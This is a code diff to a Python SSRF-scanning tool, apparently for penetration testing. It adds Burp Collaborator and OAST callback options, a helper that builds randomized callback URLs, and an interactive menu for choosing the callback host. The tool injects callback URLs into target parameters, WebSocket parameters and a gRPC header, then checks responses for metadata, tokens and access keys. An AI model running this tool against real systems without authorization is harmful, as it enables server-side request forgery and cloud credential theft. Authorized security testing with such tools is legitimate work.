@@ -66,6 +66,8 @@ def setup_argparse():
     target_group.add_argument("--targets", help="Comma-separated targets")
     target_group.add_argument("--target-file", "-f", help="File with targets (one per line)")
     parser.add_argument("--callback", "-c", help="OOB callback host")
+    parser.add_argument("--collaborator", help="OAST-compatible callback host (alias for --callback)")
+    parser.add_argument("--burp-collaborator", help="Burp Collaborator host")
     parser.add_argument("--delay", "-d", type=float, default=0.5)
     parser.add_argument("--quiet", "-q", action="store_true")
     parser.add_argument("--visible", action="store_true")
@@ -326,7 +328,12 @@ class UltimateSSRFFramework:
     def __init__(self, target, args):
         self.target = target
         self.base = f"https://{target}" if not target.startswith("http") else target
-        self.cb = args.callback or f"{target}.ssrf-test.local"
+        self.cb = (
+            args.callback
+            or args.collaborator
+            or args.burp_collaborator
+            or f"{target}.ssrf-test.local"
+        )
         self.delay = args.delay
         self.verbose = not args.quiet
         self.headless = not args.visible
@@ -343,6 +350,7 @@ class UltimateSSRFFramework:
         self.do_export_siem = args.export_siem
         self.do_export_json_api = args.export_json_api
         self.do_attack_map = args.attack_map
+
         self.output_dir = Path(args.output)
         self.output_dir.mkdir(parents=True, exist_ok=True)
 
@@ -548,11 +556,16 @@ class UltimateSSRFFramework:
             if self.cloud: print(f"  {YELLOW}{', '.join(self.cloud)}{RESET}")
             else: print(f"  {OK} No specific cloud detected")
 
+    def make_callback_url(self, tag: str = "ssrf", scheme: str = "http") -> str:
+        host = self.cb.replace("https://", "").replace("http://", "").strip("/")
+        token = random.randint(100000, 999999)
+        return f"{scheme}://{tag}-{token}.{host}"
+
     async def basic(self):
         if self.verbose: print(f"\n{CYAN}[BASIC]{RESET} Testing common SSRF parameters...")
         for ep in self.endpoints[:5]:
             for param in ["url","uri","file","path","redirect"]:
-                payload = f"http://{self.cb}/test-{random.randint(1000,9999)}"
+                payload = self.make_callback_url("basic")
                 await self.test_payload(ep, param, payload, "Basic", f"param {param}")
 
     async def run_ai_phases(self):
@@ -578,7 +591,7 @@ class UltimateSSRFFramework:
         for ep in self.endpoints:
             if "ws" in ep.path.lower() or "socket" in ep.path.lower():
                 for param in list(ep.params)[:3] + ["url"]:
-                    payload = f"wss://{self.cb}/ws-{random.randint(1000,9999)}"
+                    payload = self.make_callback_url("ws", scheme="wss")
                     await self.test_payload(ep, param, payload, "WebSocket", f"WS via {param}")
 
     async def phase_grpc(self):
@@ -592,7 +605,7 @@ class UltimateSSRFFramework:
             full_url = f"{self.base}{path}"
             try:
                 async with aiohttp.ClientSession() as session:
-                    headers = {"Content-Type":"application/grpc","X-SSRF":f"http://{self.cb}/grpc-{random.randint(1000,9999)}"}
+                    headers = {"Content-Type":"application/grpc","X-SSRF": self.make_callback_url("grpc")}
                     resp = await session.post(full_url, headers=headers, timeout=10)
                     body = await resp.text()
                     if any(kw in body.lower() for kw in ["metadata","token","access_key"]):
@@ -769,6 +782,7 @@ td{padding:8px;border-bottom:1px solid #333}
     async def run(self):
         print(f"\n{BOLD}{'='*50}{RESET}")
         print(f"{BOLD}Target:{RESET} {self.target}")
+        print(f"{BOLD}Callback:{RESET} {self.cb}")
         print(f"{BOLD}{'='*50}{RESET}")
         await self.start()
         try:
@@ -811,6 +825,17 @@ async def main():
         if not targets:
             print(f"{FAIL} No targets.")
             return
+        if not args.callback and not args.collaborator and not args.burp_collaborator:
+            print(f"\n{BOLD}{CYAN}OOB CALLBACK SELECTION{RESET}")
+            print("  1 - Default local placeholder")
+            print("  2 - Burp Collaborator")
+            print("  3 - Interactsh / OASTify / Custom OAST host")
+            cb_choice = input(f"{WARN} Choose [1/2/3] [1]: ").strip() or "1"
+            if cb_choice == "2":
+                args.burp_collaborator = input("Burp Collaborator host: ").strip()
+            elif cb_choice == "3":
+                args.collaborator = input("Callback/OAST host: ").strip()
+
         if args.ai_provider is None:
             enable_ai = input(f"{WARN} Enable AI? (none/claude/openai/ollama/gemini/mistral/deepseek) [none]: ").strip().lower()
             if enable_ai and enable_ai != "none":
